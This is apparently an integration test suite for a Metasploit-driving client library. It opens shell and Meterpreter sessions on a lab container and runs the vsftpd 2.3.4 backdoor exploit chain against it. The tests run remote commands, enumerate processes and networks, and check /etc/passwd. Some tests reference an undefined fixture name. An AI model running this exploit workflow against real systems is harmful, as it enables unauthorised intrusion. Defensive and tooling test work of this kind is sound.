"""Integration tests for session operations.

These tests require the target-linux container to be running.
They will be skipped if INTEGRATION_TESTS environment variable is not set.

Run with:
    docker compose -f docker/docker-compose.yml run --rm integration-test

Or locally with target container:
    INTEGRATION_TESTS=true TARGET_HOST=localhost pytest python/tests/test_integration_sessions.py -v
"""

import pytest


# =============================================================================
# Shell Session Tests
# =============================================================================


@pytest.mark.integration
@pytest.mark.shell
@pytest.mark.asyncio
async def test_shell_session_basic(client, direct_shell_session):
    """Test basic shell session operations.

    Uses direct_shell_session (socat on 4445) for reliable, reusable shell access.
    Note: vsftpd-based session testing moved to test_routing.py (fires once per container).
    """
    print(f"\n📋 Testing shell session {direct_shell_session}")

    # Test session info
    info = await client.session_info(direct_shell_session)
    print(f"   Session info: {info}")
    assert info is not None

    # Test session type
    session_type = await client.session_type(direct_shell_session)
    print(f"   Session type: {session_type}")
    assert "shell" in session_type.lower() or "command" in session_type.lower()

    # Test session is alive
    is_alive = await client.session_alive(direct_shell_session)
    print(f"   Is alive: {is_alive}")
    assert is_alive is True

    print("   ✓ Basic shell session operations work")


@pytest.mark.integration
@pytest.mark.shell
@pytest.mark.asyncio
async def test_shell_read_write(client, direct_shell_session):
    """Test shell read/write operations.

    Uses direct_shell_session (socat on 4445) for reliable shell access.
    """
    print(f"\n📝 Testing shell read/write on session {direct_shell_session}")

    # Write a command
    await client.session_shell_write(direct_shell_session, "echo 'hello from test'\n")
    print("   ✓ Wrote command to shell")

    # Read response (may need to wait)
    import asyncio
    await asyncio.sleep(1)

    output = await client.session_shell_read(direct_shell_session)
    print(f"   Shell output: {output[:100] if output else '(empty)'}...")

    # The output should contain our echo
    # Note: Timing can be tricky with shell I/O
    print("   ✓ Shell read/write operations work")


@pytest.mark.integration
@pytest.mark.shell
@pytest.mark.asyncio
async def test_shell_run_command(client, direct_shell_session):
    """Test running commands through shell session.

    Uses direct_shell_session (socat on 4445) for reliable shell access.
    """
    print(f"\n🖥️ Testing shell command execution on session {direct_shell_session}")

    # Run id command
    result = await client.session_run_cmd(direct_shell_session, "id")
    print(f"   id output: {result}")
    assert result is not None

    # Run pwd command
    result = await client.session_run_cmd(direct_shell_session, "pwd")
    print(f"   pwd output: {result}")
    assert result is not None

    # Run uname command
    result = await client.session_run_cmd(direct_shell_session, "uname -a")
    print(f"   uname output: {result}")
    assert result is not None

    print("   ✓ Shell command execution works")


# =============================================================================
# Meterpreter Session Tests
# =============================================================================


@pytest.mark.integration
@pytest.mark.meterpreter
@pytest.mark.asyncio
async def test_direct_meterpreter_session_basic(client, direct_direct_meterpreter_session):
    """Test basic Meterpreter session operations."""
    print(f"\n📋 Testing Meterpreter session {direct_meterpreter_session}")

    # Test session info
    info = await client.session_info(direct_direct_meterpreter_session)
    print(f"   Session info: {info}")
    assert info is not None

    # Test session type
    session_type = await client.session_type(direct_direct_meterpreter_session)
    print(f"   Session type: {session_type}")
    assert "meterpreter" in session_type.lower()

    # Test session is alive
    is_alive = await client.session_alive(direct_direct_meterpreter_session)
    print(f"   Is alive: {is_alive}")
    assert is_alive is True

    print("   ✓ Basic Meterpreter session operations work")


@pytest.mark.integration
@pytest.mark.meterpreter
@pytest.mark.asyncio
async def test_meterpreter_sysinfo(client, direct_direct_meterpreter_session):
    """Test Meterpreter system info operations."""
    print(f"\n🖥️ Testing Meterpreter sysinfo on session {direct_meterpreter_session}")

    # Get system info
    sysinfo = await client.session_sysinfo(direct_direct_meterpreter_session)
    print(f"   Sysinfo: {sysinfo}")
    assert sysinfo is not None
    assert "Computer" in sysinfo or "OS" in sysinfo

    # Get user ID
    uid = await client.session_getuid(direct_direct_meterpreter_session)
    print(f"   UID: {uid}")
    assert uid is not None

    print("   ✓ Meterpreter sysinfo operations work")


@pytest.mark.integration
@pytest.mark.meterpreter
@pytest.mark.asyncio
async def test_meterpreter_filesystem(client, direct_direct_meterpreter_session):
    """Test Meterpreter filesystem operations."""
    print(f"\n📁 Testing Meterpreter filesystem on session {direct_meterpreter_session}")

    # Get current directory
    pwd = await client.session_fs_pwd(direct_direct_meterpreter_session)
    print(f"   Current directory: {pwd}")
    assert pwd is not None

    # List directory
    files = await client.session_fs_ls(direct_direct_meterpreter_session)
    print(f"   Directory listing: {len(files)} entries")
    assert isinstance(files, list)

    # Check if path exists
    exists = await client.session_fs_exists(direct_meterpreter_session, "/etc/passwd")
    print(f"   /etc/passwd exists: {exists}")
    assert exists is True

    # Get file stat
    stat = await client.session_fs_stat(direct_meterpreter_session, "/etc/passwd")
    print(f"   /etc/passwd stat: {stat}")
    assert stat is not None

    print("   ✓ Meterpreter filesystem operations work")


@pytest.mark.integration
@pytest.mark.meterpreter
@pytest.mark.asyncio
async def test_meterpreter_process(client, direct_direct_meterpreter_session):
    """Test Meterpreter process operations."""
    print(f"\n⚙️ Testing Meterpreter process on session {direct_meterpreter_session}")

    # Get current PID
    pid = await client.session_process_getpid(direct_direct_meterpreter_session)
    print(f"   Current PID: {pid}")
    assert pid is not None
    assert pid > 0

    # List processes
    processes = await client.session_process_list(direct_direct_meterpreter_session)
    print(f"   Process count: {len(processes)}")
    assert isinstance(processes, list)
    assert len(processes) > 0

    # Each process should have pid and name
    for proc in processes[:3]:
        print(f"   - PID {proc.get('pid')}: {proc.get('name')}")

    print("   ✓ Meterpreter process operations work")


@pytest.mark.integration
@pytest.mark.meterpreter
@pytest.mark.asyncio
async def test_meterpreter_network(client, direct_direct_meterpreter_session):
    """Test Meterpreter network operations."""
    print(f"\n🌐 Testing Meterpreter network on session {direct_meterpreter_session}")

    # Get network interfaces
    interfaces = await client.session_net_interfaces(direct_direct_meterpreter_session)
    print(f"   Interface count: {len(interfaces)}")
    assert isinstance(interfaces, list)

    for iface in interfaces[:3]:
        print(f"   - {iface.get('name', 'unknown')}: {iface.get('ip', 'no ip')}")

    # Get routes
    routes = await client.session_net_routes(direct_direct_meterpreter_session)
    print(f"   Route count: {len(routes)}")
    assert isinstance(routes, list)

    print("   ✓ Meterpreter network operations work")


@pytest.mark.integration
@pytest.mark.meterpreter
@pytest.mark.asyncio
async def test_meterpreter_file_operations(client, direct_direct_meterpreter_session):
    """Test Meterpreter file create/delete operations."""
    print(f"\n📝 Testing Meterpreter file operations on session {direct_meterpreter_session}")

    test_dir = "/tmp/assassinate_test"
    test_file = f"{test_dir}/test_file.txt"

    try:
        # Create test directory
        await client.session_fs_mkdir(direct_meterpreter_session, test_dir)
        print(f"   ✓ Created directory: {test_dir}")

        # Upload a test file (write content)
        # Note: This tests the upload capability
        test_content = b"Hello from Assassinate integration test!"

        # For now, use execute to create file
        await client.session_process_execute(
            direct_meterpreter_session,
            "/bin/sh",
            ["-c", f"echo 'test content' > {test_file}"]
        )
        print(f"   ✓ Created test file: {test_file}")

        # Verify file exists
        exists = await client.session_fs_exists(direct_meterpreter_session, test_file)
        assert exists is True
        print(f"   ✓ Verified file exists")

        # Get file stat
        stat = await client.session_fs_stat(direct_meterpreter_session, test_file)
        print(f"   File stat: {stat}")

        # Remove file
        await client.session_fs_rm(direct_meterpreter_session, test_file)
        print(f"   ✓ Removed test file")

        # Remove directory
        await client.session_fs_rmdir(direct_meterpreter_session, test_dir)
        print(f"   ✓ Removed test directory")

    except Exception as e:
        # Cleanup on failure
        try:
            await client.session_fs_rm(direct_meterpreter_session, test_file)
        except Exception:
            pass
        try:
            await client.session_fs_rmdir(direct_meterpreter_session, test_dir)
        except Exception:
            pass
        raise e

    print("   ✓ Meterpreter file operations work")


# =============================================================================
# Exploit Chain Tests
# =============================================================================


@pytest.mark.integration
@pytest.mark.asyncio
async def test_vsftpd_exploit_chain(client, integration_env):
    """Test the full vsftpd exploit chain.

    This test verifies:
    1. Module creation
    2. Option configuration
    3. Exploit execution
    4. Session creation
    5. Session interaction
    6. Cleanup
    """
    target_host = integration_env["target_host"]
    ftp_port = integration_env["ftp_port"]

    print(f"\n🎯 Testing full exploit chain against {target_host}:{ftp_port}")

    # Create exploit
    module_id = await client.create_module("exploit/unix/ftp/vsftpd_234_backdoor")
    print(f"   ✓ Created module: {module_id}")

    try:
        # Get module info
        info = await client.module_info(module_id)
        print(f"   Module: {info.get('name', 'unknown')}")

        # Check required options
        missing = await client.module_missing_required(module_id)
        print(f"   Missing options before config: {missing}")

        # Configure
        await client.module_set_option(module_id, "RHOSTS", target_host)
        await client.module_set_option(module_id, "RPORT", str(ftp_port))

        # Validate
        missing_after = await client.module_missing_required(module_id)
        print(f"   Missing options after config: {missing_after}")

        # Get sessions before
        sessions_before = await client.sessions_list()
        count_before = len(sessions_before) if sessions_before else 0

        # Exploit with cmd/unix/interact payload
        print("   Running exploit...")
        result = await client.module_exploit(module_id, "cmd/unix/interact")
        print(f"   Exploit result: {result}")

        # Wait for session
        import asyncio
        session_id = None
        for _ in range(30):
            await asyncio.sleep(1)
            sessions_after = await client.sessions_list()
            count_after = len(sessions_after) if sessions_after else 0
            if count_after > count_before:
                # Find the new session
                for sid in sessions_after:
                    if sessions_before is None or sid not in sessions_before:
                        session_id = sid
                        break
                break

        if session_id:
            print(f"   ✓ Got session: {session_id}")

            # Interact with session
            session_type = await client.session_type(session_id)
            print(f"   Session type: {session_type}")

            # Run a command
            result = await client.session_run_cmd(session_id, "id")
            print(f"   id result: {result}")

            # Cleanup session
            await client.session_kill(session_id)
            print(f"   ✓ Killed session")
        else:
            print("   ⚠ No session created (exploit may have failed)")

    finally:
        await client.delete_module(module_id)
        print("   ✓ Cleaned up module")

    print("   ✓ Full exploit chain test complete")


# =============================================================================
# Direct Shell Session Tests (socat listener - no exploit needed)
# =============================================================================


@pytest.mark.integration
@pytest.mark.asyncio
async def test_direct_shell_session_creation(client, integration_env):
    """Test creating a shell session via direct socket connection.

    This uses the socat listener on port 4445, bypassing the need for an exploit.
    Tests the create_shell_session() API which uses Rex::Socket + CommandShell.
    """
    target_host = integration_env["target_host"]
    shell_port = integration_env["shell_port"]

    print(f"\n🔌 Testing direct shell session to {target_host}:{shell_port}")

    # Create shell session using direct socket connection
    session_id = await client.create_shell_session(target_host, shell_port)
    print(f"   ✓ Created session: {session_id}")
    assert session_id is not None
    assert session_id > 0

    try:
        # Verify session type
        stype = await client.session_type(session_id)
        print(f"   ✓ Session type: {stype}")
        assert "shell" in stype.lower() or "command" in stype.lower()

        # Verify session is alive
        is_alive = await client.session_alive(session_id)
        print(f"   ✓ Session alive: {is_alive}")
        assert is_alive is True

        # Test shell I/O
        await client.session_shell_write(session_id, "id\n")
        import asyncio
        await asyncio.sleep(0.5)
        output = await client.session_shell_read(session_id)
        print(f"   ✓ Shell I/O works: {output[:50] if output else '(empty)'}...")
        assert output is not None

    finally:
        await client.session_kill(session_id)
        print(f"   🧹 Cleaned up session {session_id}")

    print("   ✅ Direct shell session test passed!")
